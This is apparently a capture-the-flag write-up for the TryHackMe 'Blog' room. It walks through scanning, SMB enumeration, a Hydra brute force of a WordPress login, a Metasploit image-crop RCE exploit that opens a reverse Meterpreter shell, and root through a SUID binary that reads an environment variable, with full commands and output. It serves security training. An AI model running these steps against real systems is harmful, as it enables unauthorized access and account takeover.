# Blog
[Play](https://tryhackme.com/room/blog)

## Recon

### Nmap
```
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV -A 10.10.129.188
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-08 04:01 EDT
Nmap scan report for 10.10.129.188
Host is up (0.21s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 57:8a:da:90:ba:ed:3a:47:0c:05:a3:f7:a8:0a:8d:78 (RSA)
|   256 c2:64:ef:ab:b1:9a:1c:87:58:7c:4b:d5:0f:20:46:26 (ECDSA)
|_  256 5a:f2:62:92:11:8e:ad:8a:9b:23:82:2d:ad:53:bc:16 (ED25519)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: WordPress 5.0
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Billy Joel&#039;s IT Blog &#8211; The IT blog
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 3s, deviation: 0s, median: 2s
|_nbstat: NetBIOS name: BLOG, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: blog
|   NetBIOS computer name: BLOG\x00
|   Domain name: \x00
|   FQDN: blog
|_  System time: 2021-05-08T08:02:17+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-05-08T08:02:17
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 65.16 seconds
```

The website seems to be broken, so I read the description. Let's add the ip to the `/etc/hosts` list.

```
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts                                        
127.0.0.1       localhost
127.0.1.1       kali
10.10.129.188   blog.thm
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

### Exploration
Looking and exploring the website we have:

- comments and feed in the `meta` section not too interesting
- Looked at the posts. Nothing in the post too interesting.
- Looked at both the authors (click on authors), we can see their usernames

![](https://i.imgur.com/rP25U0x.png)

![](https://i.imgur.com/8TjQfuU.png)

Interesting! So, `bjoel` and `kwheel` are two usernames we have.


### Gobuster
```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u 10.10.129.188 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q
/rss                  (Status: 301) [Size: 0] [--> http://10.10.129.188/feed/]
/login                (Status: 302) [Size: 0] [--> http://blog.thm/wp-login.php]
/0                    (Status: 301) [Size: 0] [--> http://10.10.129.188/0/]     
/feed                 (Status: 301) [Size: 0] [--> http://10.10.129.188/feed/]  
/atom                 (Status: 301) [Size: 0] [--> http://10.10.129.188/feed/atom/]
/wp-content           (Status: 301) [Size: 319] [--> http://10.10.129.188/wp-content/]
/admin                (Status: 302) [Size: 0] [--> http://blog.thm/wp-admin/]         
/rss2                 (Status: 301) [Size: 0] [--> http://10.10.129.188/feed/]        
/wp-includes          (Status: 301) [Size: 320] [--> http://10.10.129.188/wp-includes/]
/rdf                  (Status: 301) [Size: 0] [--> http://10.10.129.188/feed/rdf/]     
/page1                (Status: 301) [Size: 0] [--> http://10.10.129.188/]              
/'                    (Status: 301) [Size: 0] [--> http://10.10.129.188/]              
/dashboard            (Status: 302) [Size: 0] [--> http://blog.thm/wp-admin/]          
/%20                  (Status: 301) [Size: 0] [--> http://10.10.129.188/]              

```
Nothing interesting. Looks like a WordPress CMS (no surprises - the template is from Frontity iirc).

### SMB
Let's explore the SMB port that was open.
```
┌──(kali㉿kali)-[/tmp]
└─$ smbclient -L 10.10.129.188 -N                                           130 ⨯

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        BillySMB        Disk      Billy's local SMB Share
        IPC$            IPC       IPC Service (blog server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
                                                                                  
┌──(kali㉿kali)-[/tmp]
└─$ smbclient //10.10.129.188/BillySMB -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue May 26 14:17:05 2020
  ..                                  D        0  Tue May 26 13:58:23 2020
  Alice-White-Rabbit.jpg              N    33378  Tue May 26 14:17:01 2020
  tswift.mp4                          N  1236733  Tue May 26 14:13:45 2020
  check-this.png                      N     3082  Tue May 26 14:13:43 2020

                15413192 blocks of size 1024. 9788312 blocks available
smb: \> get Alice-White-Rabbit.jpg
getting file \Alice-White-Rabbit.jpg of size 33378 as Alice-White-Rabbit.jpg (27.3 KiloBytes/sec) (average 27.3 KiloBytes/sec)
smb: \> get check-this.png 
getting file \check-this.png of size 3082 as check-this.png (3.4 KiloBytes/sec) (average 17.0 KiloBytes/sec)
smb: \> 
```

I have a feeling its a rickroll. Also, taylor swift uh huh. Plus, the author of the room mentioned to not go down "the rabbit hole".

Went to the qrcode link. Here's not a rickroll XD 

https://www.youtube.com/watch?v=eFTLKWw542g

![](https://i.imgur.com/Ql3cqlS.png)

Clearly the rabbit hole.

### Bruteforce passwords
I cant seem to find any creds lying around. So we'll try getting into `bjoel` and `kwheel`'s accounts by bruteforcing with Hydra.

First we want the form structure. So, I fired up burpsuite, and got the following:
```
POST /wp-login.php HTTP/1.1
Host: blog.thm

...

log=admin&pwd=admin&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1
```

Okay great! Let's go for Hydra now.

```
┌──(kali㉿kali)-[~]
└─$ hydra -l kwheel -P /usr/share/wordlists/rockyou.txt blog.thm http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:F=password"
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-05-08 06:33:32
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://blog.thm:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:F=password
[STATUS] 847.00 tries/min, 847 tries in 00:01h, 14343552 to do in 282:15h, 16 active
[STATUS] 845.00 tries/min, 2535 tries in 00:03h, 14341864 to do in 282:53h, 16 active
[80][http-post-form] host: blog.thm   login: kwheel   password: cutiepie1
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-05-08 06:37:11
```

## Foothold
So, now that we have the credentials ... so now what? Well whenever in doubt, we go back to the nmap scan. We see that the version 5.0 is being used. Looking it up, we have something tasty :D

Let's fire up `msfconsole` with the exploit [here in detail](https://blog.sonarsource.com/wordpress-image-remote-code-execution?redirect=rips) and [exploit-db](https://www.exploit-db.com/exploits/49512). Setup `options` and then `check`. Looks vulnerable, lesgooo.

```
msf6 exploit(multi/http/wp_crop_rce) > exploit

[*] Started reverse TCP handler on 10.8.150.214:4444 
[*] Authenticating with WordPress using kwheel:cutiepie1...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload
[+] Image uploaded
[*] Including into theme
[*] Sending stage (39282 bytes) to 10.10.21.78
[*] Attempting to clean up files...
[*] Meterpreter session 2 opened (10.8.150.214:4444 -> 10.10.21.78:35590) at 2021-05-08 06:59:17 -0400

meterpreter > shell
Process 1745 created.
Channel 1 created.
bash -i
bash: cannot set terminal process group (983): Inappropriate ioctl for device
bash: no job control in this shell
www-data@blog:/var/www/wordpress$ 
```

So I checked the `bjoel/user.txt`, but ... the classic "TRY HARDER" was shown to me ;-;

Let's now look for the PrivEsc.

## Priv Esc
Let's first look at who all have the set-uid bit. 
```
www-data@blog:/var/www/wordpress$ find / -type f -perm -u=s 2>/dev/null
find / -type f -perm -u=s 2>/dev/null
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/newuidmap
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/at
/usr/bin/newgidmap
/usr/bin/traceroute6.iputils
/usr/sbin/checker
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/bin/mount
/bin/fusermount
/bin/umount
/bin/ping
/bin/su
/snap/core/8268/bin/mount
/snap/core/8268/bin/ping
...
```

The thing that pops out is: `/usr/sbin/checker`

```
www-data@blog:/var/www/wordpress$ /usr/sbin/checker
/usr/sbin/checker
Not an Admin
```

```
www-data@blog:/var/www/wordpress$ strings /usr/sbin/checker
strings /usr/sbin/checker
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
puts
getenv
system
__cxa_finalize
__libc_start_main
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
=9       
AWAVI
AUATL
[]A\A]A^A_
admin
/bin/bash
Not an Admin
```

```
www-data@blog:/var/www/wordpress$ ltrace /usr/sbin/checker
ltrace /usr/sbin/checker
getenv("admin")                                  = nil
puts("Not an Admin")                             = 13
Not an Admin
+++ exited (status 0) +++
```

Okay so. At this point I used nc to get the binary to my machine, and then, much later, realised that I went too complicated opening radare lol.

Here's what to do instead. Realise that `getenv("admin")` means that we need some environmental variable. So,

```
www-data@blog:/var/www/wordpress$ export admin=admin
export admin=admin
www-data@blog:/var/www/wordpress$ /usr/sbin/checker
/usr/sbin/checker
whoami
root
```

Very nice. Let's also get the user flag while we are at it XD

```
root@blog:/var/www/wordpress# find / -type f -name user.txt 2>/dev/null
find / -type f -name user.txt 2>/dev/null
/home/bjoel/user.txt
/media/usb/user.txt
```

And we are done!
